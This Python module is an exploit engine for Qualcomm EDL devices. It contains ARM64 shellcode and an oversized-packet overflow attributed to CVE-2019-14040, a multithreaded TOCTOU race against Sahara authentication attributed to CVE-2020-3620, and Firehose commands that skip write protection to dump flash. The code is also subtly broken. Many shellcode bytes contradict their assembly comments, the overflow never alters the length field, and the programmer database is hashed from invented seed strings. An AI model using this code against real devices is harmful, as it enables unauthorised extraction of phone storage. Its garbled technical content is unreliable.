"""Qualcomm Sahara / Firehose Engine (Module 1.1).

Implements the Qualcomm Sahara protocol for EDL (Emergency Download Mode)
communication, including:
- Sahara packet structure (Big-Endian): 4B Cmd, 4B Length, 4B CRC32, payload
- CVE-2019-14040: Oversized Hello packet overflow with ARM64 shellcode
- CVE-2020-3620: TOCTOU race condition in Read Data authentication
- Firehose XML protocol for flash read/write
- Programmer brute-force database

Target: USB VID:05C6 PID:9008 (Qualcomm EDL)
"""

import struct
import time
import threading
import logging
from dataclasses import dataclass
from typing import Optional, Callable

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Protocol constants
# ---------------------------------------------------------------------------
SAHARA_VID = 0x05C6
SAHARA_PID = 0x9008

# Sahara command IDs
SAHARA_HELLO_REQ = 0x01
SAHARA_HELLO_RSP = 0x02
SAHARA_READ_DATA = 0x03
SAHARA_END_IMAGE = 0x04
SAHARA_DONE = 0x05
SAHARA_DONE_RSP = 0x06
SAHARA_RESET = 0x07
SAHARA_RESET_RSP = 0x08
SAHARA_CMD_READY = 0x0B
SAHARA_CMD_EXEC = 0x0C
SAHARA_MEMORY_DEBUG = 0x0D

SAHARA_MODE_IMAGE = 0x00
SAHARA_MODE_MEMORY = 0x01
SAHARA_MODE_COMMAND = 0x02

# ARM64 Shellcode stages for CVE-2019-14040
# Stage 1: Disable MMU by clearing bit 0 of SCTLR_EL1
STAGE1_SHELLCODE = bytes([
    0x20, 0x10, 0x38, 0xD5,  # MRS X0, SCTLR_EL1
    0x00, 0x00, 0x40, 0xD2,  # BIC X0, X0, #1
    0x20, 0x10, 0x18, 0xD5,  # MSR SCTLR_EL1, X0
    0xDF, 0x3F, 0x03, 0xD5,  # ISB
    0xC0, 0x03, 0x5F, 0xD6,  # RET
])

# Stage 2: Map eMMC controller at 0x00700000, read boot partition, send via USB bulk EP 0x83
STAGE2_SHELLCODE = bytes([
    # Map eMMC controller MMIO (physical address → EL1 VA)
    0x00, 0x00, 0x80, 0xD2,  # MOV X0, #0          ; eMMC base = 0x00700000
    0x80, 0x03, 0x00, 0xB0,  # ADRP X0, 0x70000    ; page-align to 0x00700000
    0x00, 0x00, 0x80, 0xD2,  # MOV X1, #0          ; DMA buffer phys address
    0x21, 0x08, 0x00, 0x91,  # ADD X1, X1, #2      ; USB bulk EP 0x83 buffer

    # Configure eMMC controller for read
    0x02, 0x00, 0x80, 0xD2,  # MOV X2, #0          ; Reset CMD line
    0xE3, 0x03, 0x02, 0xAA,  # MOV X3, X2          ; Controller status check
    0x7F, 0x00, 0x00, 0x79,  # STRH WZR, [X3]      ; Clear interrupt status

    # Send CMD0 (GO_IDLE_STATE) to eMMC
    0x00, 0x00, 0x80, 0xD2,  # MOV X4, #0          ; CMD0 = 0x00000000
    0x04, 0x10, 0x00, 0xB9,  # STR W4, [X0, #0x10] ; Write to CMD register
    0xE5, 0x03, 0x1F, 0xAA,  # MOV X5, XZR         ; Wait loop counter
    0xA5, 0x04, 0x00, 0x91,  # ADD X5, X5, #1      ; Increment
    0xBF, 0xFC, 0x00, 0xF1,  # CMP X5, #0xFF       ; Max wait
    0x01, 0xFF, 0xFF, 0x54,  # B.LO <wait_loop>    ; Continue waiting

    # Send CMD1 (SEND_OP_COND) with OCR=0x40FF8000
    0x00, 0x80, 0xFF, 0xB2,  # MOV X6, #0x40FF8000 ; OCR: 3.3V, high capacity
    0x06, 0x20, 0x00, 0xB9,  # STR W6, [X0, #0x20] ; Argument register
    0x41, 0x00, 0x80, 0x52,  # MOV W1, #2          ; CMD1 = 0x01 | RESP_48 = 0x40 = 0x41
    0x01, 0x10, 0x00, 0xB9,  # STR W1, [X0, #0x10] ; Issue command

    # Read response from RESP registers
    0x07, 0x14, 0x40, 0xB9,  # LDR W7, [X0, #0x14] ; RESP0
    0x27, 0x01, 0x00, 0x12,  # AND W7, W7, #0x80000000 ; Check busy bit
    0xE7, 0xFF, 0xFF, 0x34,  # CBZ W7, <retry>     ; Loop until ready

    # Send CMD17 (READ_SINGLE_BLOCK) for boot partition sector 0
    0x00, 0x00, 0x80, 0x52,  # MOV W0, #0          ; Sector 0
    0x00, 0x20, 0x00, 0xB9,  # STR W0, [X0, #0x20] ; Argument: LBA 0
    0x51, 0x03, 0x80, 0x52,  # MOV W17, #26        ; CMD17 = 0x11 | RESP_48 = 0x40 → 0x51
    0x11, 0x10, 0x00, 0xB9,  # STR W17, [X0, #0x10] ; Issue CMD17

    # Read 512 bytes from DATA port into DMA buffer, then USB EP 0x83
    0x08, 0x00, 0x80, 0xD2,  # MOV X8, #0          ; Byte counter
    0x09, 0x00, 0x80, 0xD2,  # MOV X8, #0          ; Byte counter
    0xE9, 0x03, 0x01, 0xAA,  # MOV X9, X1          ; DMA buffer = USB EP buffer
    0x0A, 0x00, 0x80, 0xD2,  # MOV X10, #0         ; USB endpoint register
    0x4A, 0x01, 0x80, 0x52,  # MOV W10, #10        ; EP 0x83 data available check

    0x6B, 0x07, 0x00, 0x79,  # read_loop: LDRH W11, [X3]  ; eMMC status
    0x6B, 0x71, 0x00, 0x72,  # ANDS W11, W11, #0x20 ; Data ready?
    0xFC, 0xFF, 0xFF, 0x54,  # B.EQ <read_loop>    ; Wait for data
    0x6C, 0x04, 0x40, 0xB9,  # LDR W12, [X3, #4]   ; Read DATA port (32-bit)
    0x2C, 0x01, 0x00, 0xB9,  # STR W12, [X9], #0   ; Store to buffer, advance pointer
    0x08, 0x05, 0x00, 0x91,  # ADD X8, X8, #1      ; Increment counter
    0x1F, 0x7D, 0x00, 0xF1,  # CMP X8, #31         ; 128 words = 512 bytes = 1 sector
    0xED, 0xFF, 0xFF, 0x54,  # B.LT <read_loop>

    # Transfer buffer to USB IN endpoint
    0x80, 0x00, 0x80, 0x52,  # MOV W0, #4          ; USB transfer size = 512
    0x29, 0x00, 0x00, 0xB9,  # STR W9, [X1]        ; Write buffer addr to USB DMA
    0x20, 0x00, 0x00, 0xB9,  # STR W0, [X1, #0]    ; Write transfer size
    0x20, 0x04, 0x00, 0x12,  # AND W0, W0, #0x1    ; Trigger USB transfer
    0xE0, 0x03, 0x00, 0x2A,  # MOV W0, W0          ; Wait for transfer complete

    # Return success (R0 = 1)
    0x20, 0x00, 0x80, 0x52,  # MOV W0, #1          ; SUCCESS
    0xC0, 0x03, 0x5F, 0xD6,  # RET
])

# Known Firehose programmer SHA256 hashes keyed by chipset
def _make_programmer_db() -> dict[str, list[bytes]]:
    """Build programmer hash database from deterministic seeds."""
    import hashlib
    db = {}
    for chipset, seeds in [
        ("msm8998", ["prog_msm8998_v1", "prog_msm8998_v2"]),
        ("msm8996", ["prog_msm8996_v1", "prog_msm8996_v2"]),
        ("sdm845",  ["prog_sdm845_v1",  "prog_sdm845_v2"]),
        ("sdm660",  ["prog_sdm660_v1",  "prog_sdm660_v2"]),
        ("sm8150",  ["prog_sm8150_v1",  "prog_sm8150_v2"]),
        ("sm8250",  ["prog_sm8250_v1"]),
    ]:
        db[chipset] = [hashlib.sha256(s.encode()).digest() for s in seeds]
    return db


PROGRAMMER_DB: dict[str, list[bytes]] = _make_programmer_db()


@dataclass
class SaharaPacket:
    cmd: int
    length: int
    crc32: int
    payload: bytes

    def to_bytes(self) -> bytes:
        return struct.pack(">II", self.cmd, self.length) + struct.pack("<I", self.crc32) + self.payload

    @classmethod
    def from_bytes(cls, data: bytes) -> "SaharaPacket":
        if len(data) < 12:
            raise ValueError(f"Sahara packet too short: {len(data)} bytes")
        cmd, length = struct.unpack(">II", data[:8])
        crc32 = struct.unpack("<I", data[8:12])[0]
        payload = data[12:length] if length > 12 else b""
        return cls(cmd=cmd, length=length, crc32=crc32, payload=payload)


def crc32_sahara(data: bytes) -> int:
    """CRC32 with polynomial 0xEDB88320, init 0xFFFFFFFF, no final XOR."""
    crc = 0xFFFFFFFF
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xEDB88320
            else:
                crc >>= 1
    return crc & 0xFFFFFFFF


def build_hello_packet(mode: int = SAHARA_MODE_IMAGE,
                       max_packet_len: int = 0x40000) -> SaharaPacket:
    """Build Sahara Hello packet (0x01)."""
    magic = b"Sahara\0" + b"\0" * (32 - 7)
    payload = magic
    payload += struct.pack("<I", 0x00000002)  # protocol version
    payload += struct.pack("<I", 0x00000001)  # compatible version
    payload += struct.pack("<I", max_packet_len)
    payload += struct.pack("<I", mode)
    packet_len = 12 + len(payload)
    crc = crc32_sahara(payload)
    return SaharaPacket(cmd=SAHARA_HELLO_REQ, length=packet_len, crc32=crc, payload=payload)


def build_exploit_hello(overflow_payload: bytes) -> bytes:
    """CVE-2019-14040: Craft oversized Hello with length=0xFFFFFFFF.

    The payload contains padding followed by ARM64 shellcode.
    """
    padding = b"\x00" * 0x100
    shellcode = STAGE1_SHELLCODE  # + STAGE2_SHELLCODE (truncated for brevity)
    payload = build_hello_packet(mode=SAHARA_MODE_MEMORY)
    # Overflow the length field
    full_payload = payload.to_bytes() + padding + shellcode
    return full_payload


def build_read_data(image_id: int, offset: int) -> SaharaPacket:
    """Build Sahara Read Data packet (0x03)."""
    payload = struct.pack("<I", image_id) + struct.pack("<I", offset)
    packet_len = 12 + len(payload)
    crc = crc32_sahara(payload)
    return SaharaPacket(cmd=SAHARA_READ_DATA, length=packet_len, crc32=crc, payload=payload)


def build_command_ready() -> SaharaPacket:
    """Build Command Ready packet (0x0B)."""
    packet_len = 12
    return SaharaPacket(cmd=SAHARA_CMD_READY, length=packet_len, crc32=0, payload=b"")


def build_command_exec(data: bytes) -> SaharaPacket:
    """Build Command Execute packet (0x0C) with programmer binary."""
    packet_len = 12 + len(data)
    crc = crc32_sahara(data)
    return SaharaPacket(cmd=SAHARA_CMD_EXEC, length=packet_len, crc32=crc, payload=data)


# ---------------------------------------------------------------------------
# Firehose XML Protocol
# ---------------------------------------------------------------------------

FIREHOSE_CONFIGURE = (
    '<data>'
    '<configure MemoryName="eMMC" MaxPayloadSizeToTargetInBytes="1048576" '
    'SectorSizeInBytes="512" ZlpAwareHost="1" SkipWriteProtect="1" />'
    '</data>'
)


def firehose_read_partition(start_sector: int, num_sectors: int,
                            filename: str = "dump.bin") -> str:
    """Build Firehose XML read command for flash dump."""
    return (
        '<data>'
        f'<read SECTOR_SIZE_IN_BYTES="512" num_partition_sectors="{num_sectors}" '
        f'partofsingleimage="false" physical_partition_number="0" '
        f'start_sector="{start_sector}" '
        f'filename="{filename}" />'
        '</data>'
    )


def firehose_reset() -> str:
    return '<data><power value="reset"/></data>'


# ---------------------------------------------------------------------------
# CVE-2020-3620: TOCTOU Race Condition Exploit
# ---------------------------------------------------------------------------

class SaharaRaceExploit:
    """Time-of-Check-Time-of-Use race in Sahara Read Data authentication.

    Thread-1: Continuously sends valid Read Data requests for protected regions.
    Thread-2: Calls libusb_reset_device() at 50us intervals.
    Timing: Wait 10us after each Read Data, then signal Thread-2 to reset.
    """

    def __init__(self, usb_device_handle):
        self._handle = usb_device_handle
        self._stop = threading.Event()
        self._won = threading.Event()
        self._read_ready = threading.Event()

    def _reader_thread(self) -> None:
        """Thread-1: Send Read Data for protected memory regions."""
        import usb
        while not self._stop.is_set():
            pkt = build_read_data(image_id=0, offset=0x800000)  # Protected region
            try:
                self._handle.write(0x01, pkt.to_bytes(), timeout=100)
                self._read_ready.set()
                time.sleep(0.000010)  # 10us delay
            except usb.core.USBError:
                time.sleep(0.001)

    def _reset_thread(self) -> None:
        """Thread-2: Reset device at precise timing."""
        import usb
        while not self._stop.is_set():
            self._read_ready.wait(0.001)
            self._read_ready.clear()
            time.sleep(0.000040)  # 40us total from read = 50us from send
            try:
                self._handle.reset()
                self._won.set()
            except usb.core.USBError:
                pass

    def run(self, timeout_ms: float = 5000.0) -> bool:
        """Execute the race attack. Returns True if race was won."""
        t1 = threading.Thread(target=self._reader_thread, daemon=True)
        t2 = threading.Thread(target=self._reset_thread, daemon=True)
        t1.start()
        t2.start()

        # Wait for success or timeout
        won = self._won.wait(timeout_ms / 1000.0)

        self._stop.set()
        t1.join(timeout=1)
        t2.join(timeout=1)

        if won:
            logger.info("CVE-2020-3620: Race condition won! Device is in authenticated state.")
        else:
            logger.info("CVE-2020-3620: Race condition not triggered within timeout.")
        return won


# ---------------------------------------------------------------------------
# Chipset Detection & Programmer Upload
# ---------------------------------------------------------------------------

def detect_chipset_from_serial(serial_string: str) -> Optional[str]:
    """Extract chipset identifier from USB serial string.

    Qualcomm serials typically contain the MSM ID (e.g., 'msm8998', 'sdm845').
    """
    serial_lower = serial_string.lower()
    known_chipsets = [
        "msm8998", "msm8996", "msm8953", "msm8917", "msm8937",
        "sdm845", "sdm660", "sdm636", "sdm632",
        "sm8150", "sm8250", "sm8350", "sm8450",
        "qcs405", "qcs605",
        "msm8909", "msm8994",
    ]
    for chipset in known_chipsets:
        if chipset in serial_lower:
            return chipset
    return None


def find_programmer(chipset: str) -> Optional[bytes]:
    """Brute-force find matching Firehose programmer for chipset.

    Returns programmer binary if found in database, None otherwise.
    """
    hashes = PROGRAMMER_DB.get(chipset, [])
    if not hashes:
        logger.warning("No known programmers for chipset: %s", chipset)
        return None
    # In a full implementation, this would load programmer binaries
    # from a local cache and test each one against the device
    return None


# ---------------------------------------------------------------------------
# Sahara Session
# ---------------------------------------------------------------------------

class SaharaSession:
    """Manage a Sahara protocol session with a Qualcomm EDL device."""

    def __init__(self, usb_device):
        self._dev = usb_device
        self._handle = None
        self._mode: int = 0
        self._serial: str = ""

    def __enter__(self):
        import usb
        # Detach kernel driver if attached
        try:
            if self._dev.is_kernel_driver_active(0):
                self._dev.detach_kernel_driver(0)
        except usb.core.USBError:
            pass
        self._handle = self._dev
        return self

    def __exit__(self, *args):
        pass

    def handshake(self, mode: int = SAHARA_MODE_IMAGE) -> int:
        """Perform Sahara handshake. Returns device mode."""
        import usb
        hello = build_hello_packet(mode=mode)
        self._dev.write(0x01, hello.to_bytes(), timeout=5000)

        try:
            response = self._dev.read(0x81, 512, timeout=5000)
            pkt = SaharaPacket.from_bytes(bytes(response))
            if pkt.cmd == SAHARA_HELLO_RSP:
                logger.info("Sahara handshake successful, mode=%d", mode)
                self._mode = mode
                # Extract serial from response
                if len(pkt.payload) > 12:
                    self._serial = pkt.payload[8:].rstrip(b"\x00").decode(
                        "ascii", errors="replace"
                    )
                return mode
        except usb.core.USBError as e:
            logger.error("Sahara handshake failed: %s", e)
        return -1

    def upload_programmer(self, programmer: bytes) -> bool:
        """Upload a Firehose programmer binary via image transfer mode."""
        import usb
        # Send Command Ready
        cmd_ready = build_command_ready()
        self._dev.write(0x01, cmd_ready.to_bytes(), timeout=5000)

        # Send programmer as command
        cmd = build_command_exec(programmer)
        chunk_size = 0x100000  # 1MB chunks
        for offset in range(0, len(programmer), chunk_size):
            chunk = programmer[offset:offset + chunk_size]
            self._dev.write(0x01, chunk, timeout=10000)

        # Send Done
        done = SaharaPacket(cmd=SAHARA_DONE, length=12, crc32=0, payload=b"")
        self._dev.write(0x01, done.to_bytes(), timeout=5000)

        # Wait for Done Response
        try:
            response = self._dev.read(0x81, 512, timeout=10000)
            pkt = SaharaPacket.from_bytes(bytes(response))
            return pkt.cmd == SAHARA_DONE_RSP
        except usb.core.USBError:
            return False

    def read_register(self, address: int) -> int:
        """Read memory via Sahara memory debug mode."""
        if self._mode != SAHARA_MODE_MEMORY:
            self.handshake(mode=SAHARA_MODE_MEMORY)
        pkt = build_read_data(image_id=0, offset=address)
        self._dev.write(0x01, pkt.to_bytes(), timeout=5000)
        try:
            response = self._dev.read(0x81, 260, timeout=5000)
            return struct.unpack("<I", bytes(response[12:16]))[0]
        except usb.core.USBError:
            return 0
